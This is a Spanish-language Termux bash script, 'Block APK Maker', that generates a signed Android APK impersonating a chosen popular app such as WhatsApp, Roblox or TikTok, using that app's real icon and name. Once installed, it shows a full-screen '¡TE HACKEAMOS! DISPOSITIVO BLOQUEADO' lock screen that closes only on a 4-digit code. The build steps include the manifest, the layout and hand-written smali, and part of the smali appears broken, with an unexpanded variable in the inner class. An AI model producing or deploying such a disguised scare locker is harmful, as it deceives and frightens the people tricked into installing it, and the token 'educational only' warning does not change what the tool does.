#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK APK MAKER ]${NC}\n"

# ============================================
# LISTA DE APPS
# ============================================
APPS=(
    "Roblox" "Free Fire" "TikTok" "Instagram"
    "Facebook" "WhatsApp" "YouTube" "Minecraft"
    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
)

# ============================================
# ICONOS
# ============================================
get_icon_url() {
    case "$1" in
        "Roblox") echo "https://img.icons8.com/color/512/roblox.png" ;;
        "Free Fire") echo "https://img.icons8.com/color/512/free-fire.png" ;;
        "TikTok") echo "https://img.icons8.com/color/512/tiktok.png" ;;
        "Instagram") echo "https://img.icons8.com/color/512/instagram-new.png" ;;
        "Facebook") echo "https://img.icons8.com/color/512/facebook-new.png" ;;
        "WhatsApp") echo "https://img.icons8.com/color/512/whatsapp.png" ;;
        "YouTube") echo "https://img.icons8.com/color/512/youtube-play.png" ;;
        "Minecraft") echo "https://img.icons8.com/color/512/minecraft.png" ;;
        "PUBG Mobile") echo "https://img.icons8.com/color/512/pubg.png" ;;
        "Clash of Clans") echo "https://img.icons8.com/color/512/clash-of-clans.png" ;;
        "Spotify") echo "https://img.icons8.com/color/512/spotify.png" ;;
        "Netflix") echo "https://img.icons8.com/color/512/netflix.png" ;;
        *) echo "" ;;
    esac
}

# ============================================
# MOSTRAR MENÚ
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Selecciona una app:${NC}\n"
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# GENERAR APK (VERSIÓN QUE FUNCIONA)
# ============================================
generar_apk() {
    local app="$1"
    local codigo="$2"
    
    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código: ${AMARILLO}$codigo${NC}\n"
    
    # ============================================
    # PASO 1: INSTALAR HERRAMIENTAS
    # ============================================
    pkg install apktool apksigner wget zip -y 2>/dev/null
    
    # ============================================
    # PASO 2: CREAR CARPETA
    # ============================================
    mkdir -p ~/block_temp
    cd ~/block_temp
    rm -rf *
    
    # ============================================
    # PASO 3: CREAR APK BASE
    # ============================================
    echo -e "${AMARILLO}[*] Creando APK base...${NC}"
    
    mkdir -p base_apk
    cd base_apk
    
    # AndroidManifest.xml
    cat > AndroidManifest.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.block.$app"
    android:versionCode="1"
    android:versionName="1.0">
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="$app"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:showOnLockScreen="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

    # Layout
    mkdir -p res/layout
    cat > res/layout/main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="#CC0000"
    android:padding="30dp">
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="⚠️"
        android:textSize="80sp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="¡TE HACKEAMOS!"
        android:textColor="#FFFFFF"
        android:textSize="34sp"
        android:textStyle="bold"
        android:layout_marginTop="10dp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="🔒 DISPOSITIVO BLOQUEADO"
        android:textColor="#FFFF00"
        android:textSize="18sp"
        android:layout_marginTop="5dp" />
    
    <EditText
        android:id="@+id/codigo"
        android:layout_width="220dp"
        android:layout_height="55dp"
        android:background="#FFFFFF"
        android:textColor="#000000"
        android:textSize="28sp"
        android:gravity="center"
        android:inputType="number"
        android:maxLength="4"
        android:layout_marginTop="25dp" />
    
    <Button
        android:id="@+id/desbloquear"
        android:layout_width="220dp"
        android:layout_height="55dp"
        android:text="🔓 DESBLOQUEAR"
        android:textColor="#FFFFFF"
        android:textSize="18sp"
        android:textStyle="bold"
        android:background="#FF0000"
        android:layout_marginTop="15dp" />
    
    <TextView
        android:id="@+id/error"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text=""
        android:textColor="#FFFF00"
        android:textSize="14sp"
        android:layout_marginTop="10dp" />
        
</LinearLayout>
EOF

    # Strings
    mkdir -p res/values
    cat > res/values/strings.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">$app</string>
</resources>
EOF

    # ============================================
    # PASO 4: ICONO
    # ============================================
    mkdir -p res/drawable
    ICON_URL=$(get_icon_url "$app")
    wget -q -O icon.png "$ICON_URL" 2>/dev/null
    
    if [ ! -f "icon.png" ]; then
        echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
    fi
    cp icon.png res/drawable/ic_launcher.png
    rm -f icon.png

    # ============================================
    # PASO 5: SMALI (CÓDIGO COMPILADO)
    # ============================================
    mkdir -p smali/com/block/$app
    
    cat > smali/com/block/$app/MainActivity.smali << EOF
.class public Lcom/block/$app/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

.field private codigoInput:Landroid/widget/EditText;
.field private errorText:Landroid/widget/TextView;
.field private CODIGO_CORRECTO:Ljava/lang/String;

.method public constructor <init>()V
    .registers 2
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    const-string v0, "$codigo"
    iput-object v0, p0, Lcom/block/$app/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 5
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    const p1, 0x7f030001
    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->setContentView(I)V
    
    invoke-virtual {p0}, Lcom/block/$app/MainActivity;->getWindow()Landroid/view/Window;
    move-result-object p1
    const/16 v0, 0x400
    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V
    
    const p1, 0x7f070001
    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->findViewById(I)Landroid/view/View;
    move-result-object p1
    check-cast p1, Landroid/widget/EditText;
    iput-object p1, p0, Lcom/block/$app/MainActivity;->codigoInput:Landroid/widget/EditText;
    
    const p1, 0x7f080001
    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->findViewById(I)Landroid/view/View;
    move-result-object p1
    check-cast p1, Landroid/widget/TextView;
    iput-object p1, p0, Lcom/block/$app/MainActivity;->errorText:Landroid/widget/TextView;
    
    const p1, 0x7f060001
    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->findViewById(I)Landroid/view/View;
    move-result-object p1
    check-cast p1, Landroid/widget/Button;
    
    new-instance v0, Lcom/block/$app/MainActivity$1;
    invoke-direct {v0, p0}, Lcom/block/$app/MainActivity$1;-><init>(Lcom/block/$app/MainActivity;)V
    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V
    return-void
.end method

.method private verificar()V
    .registers 4
    iget-object v0, p0, Lcom/block/$app/MainActivity;->codigoInput:Landroid/widget/EditText;
    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object v0
    
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z
    move-result v1
    if-eqz v1, :cond_1d
    iget-object v0, p0, Lcom/block/$app/MainActivity;->errorText:Landroid/widget/TextView;
    const-string v1, "Ingresa el c\u00f3digo"
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    return-void
    
    :cond_1d
    iget-object v1, p0, Lcom/block/$app/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_37
    iget-object v0, p0, Lcom/block/$app/MainActivity;->errorText:Landroid/widget/TextView;
    const-string v1, "✅ \u00a1DESBLOQUEADO!"
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    const-wide/16 v0, 0x7d0
    invoke-static {v0, v1}, Landroid/os/SystemClock;->sleep(J)V
    invoke-virtual {p0}, Lcom/block/$app/MainActivity;->finish()V
    goto :goto_41
    
    :cond_37
    iget-object v0, p0, Lcom/block/$app/MainActivity;->errorText:Landroid/widget/TextView;
    const-string v1, "❌ C\u00f3digo incorrecto"
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :goto_41
    return-void
.end method
EOF

    # Clase interna
    cat >> smali/com/block/$app/MainActivity.smali << 'EOF'

.class Lcom/block/$app/MainActivity$1;
.super Ljava/lang/Object;
.implements Landroid/view/View$OnClickListener;
.source "MainActivity.java"

# instance fields
.field final synthetic this$0:Lcom/block/$app/MainActivity;

# direct methods
.method constructor <init>(Lcom/block/$app/MainActivity;)V
    .registers 2
    iput-object p1, p0, Lcom/block/$app/MainActivity$1;->this$0:Lcom/block/$app/MainActivity;
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .registers 3
    iget-object p1, p0, Lcom/block/$app/MainActivity$1;->this$0:Lcom/block/$app/MainActivity;
    invoke-direct {p1}, Lcom/block/$app/MainActivity;->verificar()V
    return-void
.end method
EOF

    # ============================================
    # PASO 6: RECOMPILAR
    # ============================================
    cd ..
    
    echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
    apktool b base_apk -o app_unsigned.apk 2>/dev/null
    
    if [ ! -f "app_unsigned.apk" ]; then
        echo -e "${AMARILLO}[*] Usando método alternativo...${NC}"
        cd base_apk
        zip -r ../app_unsigned.apk * 2>/dev/null
        cd ..
    fi

    # ============================================
    # PASO 7: FIRMAR
    # ============================================
    if [ -f "app_unsigned.apk" ] && [ -s "app_unsigned.apk" ]; then
        echo -e "${AMARILLO}[*] Firmando APK...${NC}"
        
        if [ ! -f ~/debug.keystore ]; then
            keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
        fi
        
        apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
        
        if [ ! -f "${app}_block.apk" ]; then
            mv app_unsigned.apk "${app}_block.apk"
        fi
    fi

    # ============================================
    # PASO 8: GUARDAR EN DOWNLOADS
    # ============================================
    if [ -f "${app}_block.apk" ] && [ -s "${app}_block.apk" ]; then
        mv "${app}_block.apk" ~/storage/downloads/
        cd ~
        rm -rf ~/block_temp
        
        echo -e "\n${VERDE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${VERDE}[✔] ¡APK GENERADA!${NC}"
        echo -e "${VERDE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
        echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
        echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
        echo -e "${BLANCO}[+] Código: ${VERDE}$codigo${NC}"
        echo -e "\n${BLANCO}[*] Instrucciones:${NC}"
        echo -e "  1. Abre 'Descargas' en tu teléfono"
        echo -e "  2. Instala ${VERDE}${app}_block.apk${NC}"
        echo -e "  3. Al abrir, ingresa: ${VERDE}$codigo${NC}"
        echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
        echo -e "${VERDE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    else
        echo -e "\n${ROJO}[!] ERROR: No se pudo generar la APK${NC}"
        echo -e "${AMARILLO}[*] Instalando herramientas manualmente...${NC}"
        pkg install apktool apksigner wget zip openjdk-17 -y
        cd ~
        rm -rf ~/block_temp
    fi
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK APK MAKER ]${NC}\n"
    
    mostrar_menu
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
    
    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"
        
        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos:${NC}"
        while true; do
            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                break
            else
                echo -e "${ROJO}[!] Código inválido (1000-9999)${NC}"
            fi
        done
        
        generar_apk "$APP_SELECCIONADA" "$CODIGO"
        read -p "Presiona Enter para continuar..."
    else
        echo -e "${ROJO}[!] Opción inválida${NC}"
        sleep 2
    fi
done
